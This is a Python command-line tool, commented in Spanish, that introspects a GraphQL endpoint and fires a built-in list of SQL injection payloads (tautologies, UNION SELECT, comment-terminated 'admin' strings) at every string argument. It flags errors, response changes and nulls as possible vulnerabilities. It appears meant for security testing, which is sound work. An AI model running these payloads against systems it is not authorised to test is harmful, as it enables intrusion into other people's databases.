#!/usr/bin/env python3
"""
sqli_detector.py
Mini detector de SQLi para endpoints GraphQL (Python).

Uso:
    python sqli_detector.py <ENDPOINT_URL> '<HEADERS_JSON>'
Ejemplo:
    python sqli_detector.py http://localhost:4000/graphql '{"Authorization":"Bearer TOKEN"}'
Opcional:
    --json-out findings.json
"""

import sys
import json
import re
import argparse
from typing import Any, Dict, List, Optional
import requests

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    types {
      kind
      name
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
        type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
"""

PAYLOADS = [
    '" OR "1"="1',
    "' OR '1'='1",
    "admin' -- ",
    "x' UNION SELECT NULL-- ",
    '"\' OR 1=1 -- ',
    "'",
    "admin'/*",
    'admin"/*',
]

SQL_ERROR_SIGS = [
    re.compile(r"SQL syntax", re.I),
    re.compile(r"syntax error", re.I),
    re.compile(r"unterminated quoted string", re.I),
    re.compile(r"mysql", re.I),
    re.compile(r"postgres", re.I),
    re.compile(r"sqlite", re.I),
    re.compile(r"sqlstate", re.I),
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"pg_query\(", re.I),
]

TIMEOUT = 20  # segundos


def try_parse_headers(h: Optional[str]) -> Dict[str, str]:
    if not h:
        return {}
    try:
        parsed = json.loads(h)
        if isinstance(parsed, dict):
            return parsed
        # aceptar también lista de pares [{"Header":"v"}]
        if isinstance(parsed, list):
            res = {}
            for item in parsed:
                if isinstance(item, dict):
                    res.update(item)
            return res
        print("[!] Headers JSON no es un objeto/dict; ignorando.")
        return {}
    except Exception:
        print("[!] Error parseando headers JSON; ignorando.")
        return {}


def post_graphql(endpoint: str, headers: Dict[str, str], payload: Dict[str, Any]) -> Dict[str, Any]:
    h = {"Content-Type": "application/json"}
    h.update(headers)
    try:
        r = requests.post(endpoint, json=payload, headers=h, timeout=TIMEOUT)
        try:
            data = r.json()
        except Exception:
            data = {"_raw_text": r.text}
        return {"status": r.status_code, "data": data}
    except requests.RequestException as e:
        return {"status": 0, "data": {"errors": [{"message": str(e)}]}}


def extract_named_type(t: Optional[Dict[str, Any]]) -> Optional[str]:
    if not t:
        return None
    if t.get("name"):
        return t.get("name")
    if t.get("ofType"):
        return extract_named_type(t.get("ofType"))
    return None


def is_string_type(arg_type_name: Optional[str]) -> bool:
    if not arg_type_name:
        return False
    n = arg_type_name.lower()
    return n in ("string", "id", "varchar", "text")


def find_type_definition(schema_types: List[Dict[str, Any]], name: Optional[str]) -> Optional[Dict[str, Any]]:
    if not name:
        return None
    for t in schema_types:
        if t.get("name") == name:
            return t
    return None


def pick_scalar_field_for_type(type_def: Optional[Dict[str, Any]], schema_types: List[Dict[str, Any]]) -> Optional[str]:
    if not type_def or not type_def.get("fields"):
        return None
    for f in type_def.get("fields", []):
        tname = extract_named_type(f.get("type"))
        if not tname:
            continue
        low = tname.lower()
        if low in ("string", "int", "float", "boolean", "id", "integer"):
            return f.get("name")
        # si el campo tiene tipo estructurado, preferimos campos simples como 'id'/'username'
        td = find_type_definition(schema_types, tname)
        if not td or not td.get("fields"):
            return f.get("name")
    return None


def check_sql_error_in_response(resp_data: Dict[str, Any]) -> Optional[Dict[str, str]]:
    if not resp_data:
        return None
    errors = resp_data.get("errors")
    if not errors:
        return None
    for e in errors:
        msg = str(e.get("message", ""))
        for rx in SQL_ERROR_SIGS:
            if rx.search(msg):
                return {"evidence": msg, "pattern": rx.pattern}
    return None


def normalize_resp(data: Any) -> str:
    try:
        return json.dumps(data, sort_keys=True, ensure_ascii=False)
    except Exception:
        return str(data)


def truncate(s: str, n: int = 180) -> str:
    if not s:
        return ""
    return s if len(s) <= n else s[:n] + "..."


def build_query(field_name: str, arg_name: str, payload_value: str, selection: Optional[str]) -> Dict[str, Any]:
    # Usamos inline con json.dumps para escapar correctamente
    value_literal = json.dumps(payload_value)
    if selection:
        q = f'query {{ {field_name}({arg_name}: {value_literal}) {{ {selection} }} }}'
    else:
        q = f'query {{ {field_name}({arg_name}: {value_literal}) }}'
    return {"query": q}


def run_detector(endpoint: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
    print(f"[*] Ejecutando introspección en {endpoint}")
    intros = post_graphql(endpoint, headers, {"query": INTROSPECTION_QUERY})
    schema = None
    try:
        schema = intros["data"]["data"]["__schema"]
    except Exception:
        print("[!] No se pudo obtener esquema por introspección. Respuesta:", intros.get("data"))
        return []

    types = schema.get("types", [])
    query_type = next((t for t in types if t.get("name") == "Query"), None)
    if not query_type or not query_type.get("fields"):
        print("[!] No se ha encontrado tipo Query o campos.")
        return []

    findings: List[Dict[str, Any]] = []

    for field in query_type.get("fields", []):
        args = field.get("args", []) or []
        if not args:
            continue
        for arg in args:
            arg_type_name = extract_named_type(arg.get("type"))
            if not is_string_type(arg_type_name):
                continue

            return_type_name = extract_named_type(field.get("type"))
            return_type_def = find_type_definition(types, return_type_name)
            selection = pick_scalar_field_for_type(return_type_def, types)
            # fallback
            if not selection and return_type_def and return_type_def.get("fields"):
                fallback = next((f for f in return_type_def["fields"] if f["name"] in ("id", "uuid", "username", "name", "title")), None)
                if fallback:
                    selection = fallback["name"]

            benign = "testuser"
            base_payload = build_query(field["name"], arg["name"], benign, selection)
            base_resp = post_graphql(endpoint, headers, base_payload)
            base_norm = normalize_resp(base_resp.get("data"))

            for payload in PAYLOADS:
                attack_payload = build_query(field["name"], arg["name"], payload, selection)
                attack_resp = post_graphql(endpoint, headers, attack_payload)

                # 1) errores SQL en response.errors
                sql_err = check_sql_error_in_response(attack_resp.get("data"))
                if sql_err:
                    findings.append({
                        "field": field["name"],
                        "arg": arg["name"],
                        "payload": payload,
                        "type": "SQL_ERROR_IN_RESPONSE",
                        "evidence": sql_err["evidence"],
                        "base_response": base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                    })
                    print(f"[VULN?] {field['name']}({arg['name']}) -> SQL error con payload: {payload}")
                    continue

                # 2) cambios en contenido devuelto
                attack_norm = normalize_resp(attack_resp.get("data"))
                if base_norm and attack_norm and base_norm != attack_norm:
                    findings.append({
                        "field": field["name"],
                        "arg": arg["name"],
                        "payload": payload,
                        "type": "RESPONSE_DIFF",
                        "evidence": f"Baseline != Attack (baseline {truncate(base_norm)}, attack {truncate(attack_norm)})",
                        "base_response": base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                    })
                    print(f"[POTENCIAL] {field['name']}({arg['name']}) -> cambio en respuesta con payload: {payload}")
                    continue

                # 3) Null inesperado
                if base_norm and attack_norm and ("null" in attack_norm) and ("null" not in base_norm):
                    findings.append({
                        "field": field["name"],
                        "arg": arg["name"],
                        "payload": payload,
                        "type": "NULL_ON_ATTACK",
                        "evidence": "Null returned on attack while baseline had data",
                        "base_response": base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                    })
                    print(f"[POTENCIAL] {field['name']}({arg['name']}) -> null returned con payload: {payload}")
                    continue

    if not findings:
        print("[*] No se detectaron indicios obvios de SQLi con los payloads básicos.")
    else:
        print("\n[*] Hallazgos:")
        for f in findings:
            print("---")
            print(f"Field: {f['field']}")
            print(f"Arg: {f['arg']}")
            print(f"Payload: {f['payload']}")
            print(f"Tipo: {f['type']}")
            print(f"Evidencia: {f['evidence']}")
            print("Base response:", truncate(json.dumps(f.get("base_response", {}), ensure_ascii=False)))
            print("Attack response:", truncate(json.dumps(f.get("attack_response", {}), ensure_ascii=False)))
    return findings


def main():
    parser = argparse.ArgumentParser(description="Mini-detector de SQLi para GraphQL (Python)")
    parser.add_argument("endpoint", help="URL del endpoint GraphQL")
    parser.add_argument("headers", nargs="?", help="Cabeceras JSON opcional, ejemplo: '{\"Authorization\":\"Bearer T\"}'", default=None)
    parser.add_argument("--json-out", help="Guardar hallazgos en JSON", default=None)
    args = parser.parse_args()

    headers = try_parse_headers(args.headers)
    findings = run_detector(args.endpoint, headers)
    if args.json_out:
        try:
            with open(args.json_out, "w", encoding="utf-8") as f:
                json.dump(findings, f, ensure_ascii=False, indent=2)
            print(f"[*] Hallazgos guardados en {args.json_out}")
        except Exception as e:
            print("[!] Error guardando JSON:", str(e))


if __name__ == "__main__":
    main()
